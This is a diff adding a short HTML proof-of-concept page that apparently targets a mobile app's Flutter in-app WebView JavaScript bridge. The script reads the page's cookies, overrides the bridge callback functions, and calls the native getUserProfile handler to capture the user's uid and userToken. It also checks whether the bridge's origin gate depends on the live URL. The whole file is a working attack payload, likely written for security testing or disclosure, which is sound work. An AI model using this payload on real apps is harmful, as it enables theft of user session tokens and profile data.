@@ -1,0 +1,25 @@
+<!doctype html><meta charset=utf-8><body style="background:#ffe;font:12px monospace">
+<pre id=o>running</pre>
+<script>
+var L=[];
+function w(s){L.push(s);document.getElementById('o').textContent=
+  "=== TOP-LEVEL IS NOW THE ATTACKER ===\norigin: "+location.origin+"\n\n"+L.join("\n");}
+w("cookie: "+(document.cookie||"(empty)"));
+w("fliwv: "+(typeof window.flutter_inappwebview));
+w("bridgeObj: "+(typeof window._b_bridge_UserProfile_));
+window._b_bridge_callback_=function(o){
+  try{var d=(typeof o==="string")?JSON.parse(o):o;
+    w("*** CALLBACK "+d.moduleName+"."+d.methodName+" uid="+(d.params&&d.params.uid)+
+      " userToken="+(d.params&&d.params.userToken?d.params.userToken:"(none)"));}
+  catch(e){w("cb err "+e);}
+};
+window.invokeCallback=window._b_bridge_callback_;
+try{
+  window.flutter_inappwebview.callHandler("_b_bridge_UserProfile_",JSON.stringify({
+    moduleName:"UserProfile",methodName:"getUserProfile",uniqueId:"topnav1",params:{}}))
+   .then(function(r){w("promise="+JSON.stringify(r));})
+   .catch(function(e){w("promise-err="+e);});
+  w("call dispatched");
+}catch(e){w("THROW "+e);}
+setTimeout(function(){ if(L.join("").indexOf("CALLBACK")<0) w("\n>>> NO CALLBACK after 8s: gate uses the LIVE url"); },8000);
+</script></body>
